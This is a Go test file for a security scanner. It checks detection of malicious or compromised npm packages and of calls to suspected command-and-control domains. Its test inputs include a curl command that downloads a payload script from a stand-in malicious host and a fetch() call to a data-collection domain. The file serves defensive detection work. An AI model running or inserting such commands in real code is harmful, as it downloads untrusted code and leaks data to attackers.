package check

import "testing"

func TestCheckPackageIOC_MaliciousMatch(t *testing.T) {
	match, err := CheckPackageIOC("npm", "plain-crypto-js", "1.0.0")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if match == nil {
		t.Fatal("expected match for known malicious package plain-crypto-js")
	}
	if match.Name != "plain-crypto-js" {
		t.Errorf("match.Name = %q, want %q", match.Name, "plain-crypto-js")
	}
}

func TestCheckPackageIOC_CompromisedVersion(t *testing.T) {
	match, err := CheckPackageIOC("npm", "axios", "1.14.1")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if match == nil {
		t.Fatal("expected match for compromised axios@1.14.1")
	}
}

func TestCheckPackageIOC_SafePackage(t *testing.T) {
	match, err := CheckPackageIOC("npm", "express", "4.18.2")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if match != nil {
		t.Errorf("expected no match for safe package express, got: %+v", match)
	}
}

func TestCheckC2Domain(t *testing.T) {
	tests := []struct {
		content string
		want    int
	}{
		{"curl https://evilpackage.com/payload.sh", 1},
		{"fetch('https://npm-stats-collector.xyz/data')", 1},
		{"normal code without any issues", 0},
		{"https://evilpackage.com and https://npm-stats-collector.xyz", 2},
	}

	for _, tt := range tests {
		matches, _ := CheckC2Domain(tt.content)
		if len(matches) != tt.want {
			t.Errorf("CheckC2Domain(%q) = %d matches, want %d", tt.content[:min(50, len(tt.content))], len(matches), tt.want)
		}
	}
}
